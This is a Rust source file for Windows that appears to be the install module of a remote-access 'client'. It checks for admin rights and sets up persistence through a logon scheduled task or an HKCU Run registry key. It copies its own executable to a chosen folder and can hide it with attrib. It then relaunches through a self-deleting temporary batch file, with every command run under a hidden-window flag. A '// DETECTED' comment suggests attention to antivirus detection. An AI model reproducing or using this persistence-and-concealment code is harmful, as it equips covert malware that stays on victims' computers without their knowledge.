use winapi::um::processthreadsapi::OpenProcessToken;
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::winnt::{ TokenElevation, HANDLE, TOKEN_ELEVATION, TOKEN_QUERY };
use std::ptr;

use std::{
    env,
    fs::{self, File},
    io::{Read, Write},
    path::PathBuf,
    process::{Command, Stdio},
    thread::sleep,
    time::Duration,
};

use std::os::windows::process::CommandExt;

pub fn is_elevated() -> bool {
    unsafe {
        let mut handle: HANDLE = ptr::null_mut();
        if
            OpenProcessToken(
                winapi::um::processthreadsapi::GetCurrentProcess(),
                TOKEN_QUERY,
                &mut handle
            ) != 0
        {
            let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
            let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
            if
                GetTokenInformation(
                    handle,
                    TokenElevation,
                    &mut elevation as *mut _ as *mut _,
                    size,
                    &mut size
                ) != 0
            {
                return elevation.TokenIsElevated != 0;
            }
        }
    }
    false
}

fn get_special_folder(name: &str) -> Option<PathBuf> {
    let folder: Option<String> = match name.to_lowercase().as_str() {
        "appdata" => env::var("APPDATA").ok(),
        "localappdata" => env::var("LOCALAPPDATA").ok(),
        "temp" => env::var("TEMP").ok(),
        "system" => Some("C:\\Windows\\System32".to_string()),
        "desktop" => {
            let userprofile = env::var("USERPROFILE").ok()?;
            Some(format!("{}\\Desktop", userprofile))
        },
        "programfiles" => env::var("ProgramFiles").ok(),
        _ => None,
    };

    folder.map(PathBuf::from)
}

pub fn install(folder: String, filename: String, hidden: bool) {
    println!("Installing client to {}", folder);
    let install_dir = match get_special_folder(folder.as_str()) {
        Some(path) => path,
        None => {
            eprintln!("Invalid install folder.");
            return;
        }
    };

    let install_path = install_dir.join(filename);

    let current_exe = std::env::current_exe().unwrap();
    if current_exe == install_path {
        return; // Already installed
    }

    const HIDE: u32 = 0x08000000;

    // Set persistence
    if is_elevated() { // DETECTED
        // schtasks
        let task_name = install_path.file_stem().unwrap().to_string_lossy();
        let task_cmd = format!(
            "schtasks /create /f /sc onlogon /rl highest /tn \"{}\" /tr '\"{}\"'",
            task_name, install_path.display()
        );
        let _ = Command::new("cmd")
            .creation_flags(HIDE)
            .args(["/c", &task_cmd])
            .output();
    } else {
        // Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
        let value_name = install_path.file_stem().unwrap().to_string_lossy();
        let _ = Command::new("reg")
            .args([
                "add",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                "/v",
                &value_name,
                "/d",
                &format!("\"{}\"", install_path.display()),
                "/f",
            ])
            .creation_flags(HIDE)
            .output();
    }

    // Copy executable
    if install_path.exists() {
        let _ = fs::remove_file(&install_path);
        sleep(Duration::from_secs(1));
    }

    if let Ok(mut target) = File::create(&install_path) {
        if let Ok(mut current) = File::open(&current_exe) {
            let mut buffer = Vec::new();
            let _ = current.read_to_end(&mut buffer);
            let _ = target.write_all(&buffer);
        }
    }

    // Optional: hide file (very basic, can use attrib command)
    if hidden {
        let _ = Command::new("attrib")
            .args(["+h", install_path.to_str().unwrap()])
            .creation_flags(HIDE)
            .output();
    }

    // Relaunch from new path using temp .bat
    let batch_path = std::env::temp_dir().join("r.bat");
    if let Ok(mut bat) = File::create(&batch_path) {
        let _ = writeln!(bat, "@echo off");
        let _ = writeln!(bat, "timeout /t 3 > NUL");
        let _ = writeln!(bat, "start \"\" \"{}\"", install_path.display());
        let _ = writeln!(bat, "del \"%~f0\" /f /q");
    }

    let _ = Command::new(batch_path)
        .creation_flags(HIDE)
        .spawn();

    std::process::exit(0);
}

